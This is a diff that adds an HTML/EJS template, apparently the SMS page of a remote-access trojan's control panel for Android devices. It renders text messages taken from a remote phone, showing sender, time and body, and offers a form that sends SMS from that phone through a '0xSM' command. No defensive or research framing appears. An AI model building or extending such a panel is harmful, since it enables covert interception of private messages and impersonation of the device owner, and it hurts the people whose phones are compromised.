@@ -1,0 +1,126 @@
+<head>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Audiowide|Sofia|Trirong">
+<style>
+.jai {
+        -webkit-text-stroke-width: 1px;
+        -webkit-text-stroke-color: #e03113;
+        text-shadow: 0px 1px 1px white;
+        font-family: "Trironga", sans-serif;
+      }
+    .ram {
+        color: Green;
+        text-shadow: 2px 3px 6px lime;
+    }
+    i{
+        color: red;
+    }
+    i {
+        text-shadow: 0px 2px 6px rgb(0, 0, 0);
+    }
+    .fa{
+        font-size: 50px;
+    }
+    .b {font-family: "Sofia", sans-serif;}
+</style>
+
+<div class="ui top attached tabular menu" style="background-color: #000000;">
+    <a class="item active" data-tab="first" style="background-color: #000000;">
+         <font class="jai" style="color:red; text-shadow: 0px 0px 8px red;">SMS Logs</font>
+    </a>
+    <a class="item " data-tab="second" style="background-color: #000000;">
+      <i class="icon send"></i> <font style="color:red; text-shadow: 0px 0px 8px red;">Send SMS</font>
+    </a>
+</div>
+
+<div class="ui bottom attached tab segment active" data-tab="first" style="background-color:  rgb(131, 140, 143);">
+    <!-- SMS Log -->
+    <div class="ui secondary menu" style="background-color:  rgb(131, 140, 143);">
+        <div class="right menu" style="background-color:  rgb(131, 140, 143);">
+            <button onclick="updateButton(this, '0xSM', {'action': 'ls'})" class="ui blue button"> <i
+                    class="icon sync"></i>Update</button>
+        </div>
+    </div>
+    <div class="ui feed" style="background-color:  rgb(131, 140, 143);">
+
+        <% pageData.forEach((smsData) => { 
+                let date = new Date(parseInt(smsData.date));
+                let status = {
+                    "updown": "question",
+                    "action": ""
+                };
+                if(smsData.type === "1") status = {
+                    "updown": "down",
+                    "action": "Recieved From "
+                };
+                if(smsData.type === "2") status = {
+                    "updown": "up",
+                    "action": "Sent To "
+                };
+            %>
+        <div class="event">
+            <div class="label">
+                <i class="arrow <%= status.updown %> icon"></i>
+            </div>
+            <div class="content">
+                <div class="summary" >
+                    <%= status.action %> <a href="?filter=<%= smsData.address %>"><%= smsData.address %></a>
+                    <div class="date"><%= date.toLocaleString('en-GB', { timeZone: 'UTC' }) %></div>
+                </div>
+                <div class="extra text">
+                    <%= smsData.body %>
+                </div>
+            </div>
+            <div class="ui red divider"></div>
+
+        </div>
+        <div class="ui red divider"></div>
+
+        <% }) %>
+    </div>
+</div>
+
+<div class="ui bottom attached tab segment" data-tab="second"  style="background-color: #404451;">
+    <!-- Send SMS -->
+    <div class="ui red form" style="color:red; background-color: #010101; text-shadow: 0px 0px 8px red;">
+        <div class="ui labeled input fluid" style="background-color:  rgb(131, 140, 143);">
+            <div class="ui label" style="color:red; background-color: #010101; text-shadow: 0px 0px 8px red;">
+                To
+            </div>
+            <input style="text-shadow: 0 0 7px #cf0be9; color: #fbfdfe; background-color:  rgb(131, 140, 143);" id="to" type="number">
+        </div>
+        <br>
+        <div class="field">
+            <label style="color:red; background-color: #010101; text-shadow: 0px 0px 8px red;">Message</label>
+            <textarea style="text-shadow: 0 0 7px #cf0be9; color: #fbfdfe; background-color:  rgb(131, 140, 143);" id="sms"></textarea>
+        </div>
+        <button class="ui button fluid positive" type="submit" onclick="sendSMS(this)">
+            <i class="paper plane outline icon"></i>
+            Send
+        </button>
+    </div>
+</div>
+
+<script>
+    $('.menu .item').tab();
+    function sendSMS(element) {
+        $(element).addClass('loading')
+        sendCommand('0xSM', {
+            'action': 'sendSMS',
+            'sms': $('#sms').val(),
+            'to': $('#to').val()
+        }, (error, message) => {
+            if (error) {
+                setTimeout(() => {
+                    showNotification('#f03434', error)
+                    $(element).removeClass('loading')
+                }, 300)
+            } else {
+                setTimeout(() => {
+                    $(element).removeClass('loading');
+                    if (message === 'Requested') showNotification('#2ecc71', 'SMS Sent');
+                    else showNotification('#2ecc71', message);
+                }, 300)
+            }
+        });
+    }
+</script>
